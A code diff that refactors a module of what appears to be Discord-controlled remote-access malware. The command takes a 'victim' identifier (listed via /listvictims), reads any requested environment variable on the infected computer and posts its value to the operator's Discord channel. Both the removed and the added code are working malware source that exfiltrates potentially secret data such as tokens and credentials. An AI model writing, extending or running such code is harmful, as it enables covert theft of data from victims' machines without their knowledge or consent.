@@ -18,45 +18,44 @@ class GetEnvironment(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         environment: The variable of which the value is wanted
         """
-        if str(victim) == str(self.bot.identifier):
-            try: 
-                value = os.getenv(environment)
-            except: 
-                return await ctx.response.send_message(
-                    embed=self.bot.genEmbed(
-                        "Invalid environment variable!", 
-                        datetime.now()
-                    )
-                )
-                
-            if value is None:
-                return await ctx.response.send_message(
-                    embed=self.bot.genEmbed(
-                        "Variable's value is empty!", 
-                        datetime.now()
-                    )
-                )
-                
-            if value == "":
-                return await ctx.response.send_message(
-                    embed=self.bot.genEmbed(
-                        "Variable's value is empty!", 
-                        datetime.now()
-                    )
-                )
-                
-            if len(value) >= 1023:
-                return await ctx.response.send_message(f"The value for {environment} is:\n```{value}```")
-                
-            await ctx.response.send_message(
-                embed = self.bot.genEmbed( 
-                    f"Found environment variable", 
-                    datetime.now() 
-                ).add_field(
-                    name="Value for "+environment+" is:", 
-                    value="```"+value+"```"
+        if victim != str(self.bot.identifier):
+            return
+        try: 
+            value = os.getenv(environment)
+        except: 
+            return await ctx.response.send_message(
+                embed=self.bot.genEmbed(
+                    "Invalid environment variable!", 
+                    datetime.now()
                 )
             )
+
+        if value is None:
+            return await ctx.response.send_message(
+                embed=self.bot.genEmbed(
+                    "Variable's value is empty!", 
+                    datetime.now()
+                )
+            )
+
+        if value == "":
+            return await ctx.response.send_message(
+                embed=self.bot.genEmbed(
+                    "Variable's value is empty!", 
+                    datetime.now()
+                )
+            )
+
+        if len(value) >= 1023:
+            return await ctx.response.send_message(f"The value for {environment} is:\n```{value}```")
+
+        await ctx.response.send_message(
+            embed=self.bot.genEmbed(
+                "Found environment variable", datetime.now()
+            ).add_field(
+                name=f"Value for {environment} is:", value=f"```{value}```"
+            )
+        )
 
 def setup(bot: commands.Bot):
     bot.add_cog(GetEnvironment(bot))
